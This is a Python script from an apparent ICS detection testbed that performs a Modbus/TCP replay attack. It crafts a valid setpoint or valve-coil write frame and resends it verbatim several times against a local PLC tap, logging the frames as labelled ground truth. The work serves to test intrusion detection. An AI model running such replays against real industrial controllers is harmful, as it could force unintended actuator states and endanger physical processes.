"""
Replay attack against the Modbus/TCP PLC.

Threat model: an attacker who can reach the PLC (or sit on the ICS LAN)
captures a legitimate write command and retransmits it later, out of context,
to force actuator/setpoint state the operator did not intend. Modbus/TCP has
no authentication, no nonce, and no integrity check, so a byte-for-byte
retransmission is accepted as genuine - which is the whole point this project
is measuring detection against.

What this script does:
  1. Sends one *legitimate-looking* write (a normal setpoint value) to learn
     the exact bytes of a valid frame - standing in for having sniffed one.
  2. Retransmits that captured frame verbatim, several times, with its
     ORIGINAL transaction ID reused each time. Reused/stale transaction IDs
     and duplicated payloads with no matching fresh operator action are the
     signature a replay leaves on the wire.

It uses an ordinary ephemeral source port and reports the actual port on
stdout (`SOURCE_PORT=<n>`) so the orchestrator can record it as ground truth.
(Pinning a fixed source port is fragile: a back-to-back run collides with the
previous connection still in TIME_WAIT on Windows and the bind fails.)

Varied mode (`--seed N`): without a seed the script sends the same fixed
sequence every run (setpoint 55%, 8 copies, 0.4 s apart), which is what the
official 10-run results used. With a seed, plan() draws a different replay
each session - which frame is captured (a setpoint write in the operator's
20-90% band, or a valve coil write), its transaction ID, how many copies and
how far apart (0.3-1.5 s, so some replays are slower than the operator's
~1 s poll) - so a threshold tuned on one session cannot simply memorize the
attack it will be tested on. The drawn parameters are printed as a
`PARAMS=<json>` line for the manifest.

Usage (normally invoked by attacks/run_scenario.py):
    python attacks/replay_attack.py
    python attacks/replay_attack.py --seed 7
"""

import json
import random
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus_frames import (log_packet, parse_transaction_id,  # noqa: E402
                           write_single_coil, write_single_register)

TAP_HOST = "127.0.0.1"
TAP_PORT = 5021

HR_PUMP_SETPOINT = 1
COIL_INLET_VALVE = 0
COIL_OUTLET_VALVE = 1
REPLAY_COUNT = 8               # how many times to re-send the captured frame
REPLAY_SPACING = 0.4          # seconds between replays


def plan(seed: int | None = None) -> dict:
    """The replay's parameters: the fixed defaults, or (with a seed) a random
    draw. Plain data so it can be logged and tested."""
    if seed is None:
        return {"target": "setpoint", "address": HR_PUMP_SETPOINT, "value": 55,
                "txid": 0x2A11, "count": REPLAY_COUNT, "spacing": REPLAY_SPACING}
    rng = random.Random(seed)
    p = {"txid": rng.randrange(0x10000), "count": rng.randint(3, 12),
         "spacing": round(rng.uniform(0.3, 1.5), 3)}
    if rng.random() < 0.7:
        # A value the operator really sends: 20-90% in steps of 5.
        p.update(target="setpoint", address=HR_PUMP_SETPOINT,
                 value=rng.randrange(20, 95, 5))
    else:
        p.update(target="coil", address=rng.choice([COIL_INLET_VALVE, COIL_OUTLET_VALVE]),
                 value=rng.choice([0, 1]))
    return p


def captured_frame(p: dict) -> bytes:
    if p["target"] == "coil":
        return write_single_coil(p["txid"], p["address"], on=bool(p["value"]))
    return write_single_register(p["txid"], p["address"], p["value"])


def parse_seed(argv: list[str]) -> int | None:
    if "--seed" in argv:
        return int(argv[argv.index("--seed") + 1])
    return None


def connect() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TAP_HOST, TAP_PORT))
    return sock


def main() -> None:
    p = plan(parse_seed(sys.argv))
    print("PARAMS=" + json.dumps(p), flush=True)
    sock = connect()
    source_port = sock.getsockname()[1]
    # Reported on stdout so the orchestrator can label this session's frames.
    print(f"SOURCE_PORT={source_port}", flush=True)
    print(f"[replay] connected via tap {TAP_HOST}:{TAP_PORT} "
          f"(source port {source_port})")

    # Step 1: craft/capture a legitimate write frame (by default setpoint
    # 55%). In a real attack this frame would come from a sniffed operator
    # command; here we mint one valid frame and treat its bytes as the
    # captured payload.
    captured = captured_frame(p)
    # The seed is the stand-in for the recorded operator command, not a replay:
    # it is logged as "seed" so the labeler can keep it out of scoring.
    log_packet(captured, "seed", f"stand-in for the recorded operator write "
                                 f"({p['target']} {p['address']} = {p['value']})")
    sock.sendall(captured)
    _ = sock.recv(256)  # let the PLC answer so the capture stays well-formed
    print(f"[replay] captured a legitimate write frame, txid="
          f"0x{parse_transaction_id(captured):04X}")

    # Step 2: retransmit it verbatim, out of context, reusing the same txid.
    count = p["count"]
    for i in range(count):
        log_packet(captured, "attack", f"replay {i + 1}/{count}")
        sock.sendall(captured)
        try:
            sock.recv(256)
        except OSError:
            pass
        print(f"[replay] resent captured frame {i + 1}/{count} "
              f"(reused txid 0x{parse_transaction_id(captured):04X})")
        time.sleep(p["spacing"])

    sock.close()
    print("[replay] done.")


if __name__ == "__main__":
    main()
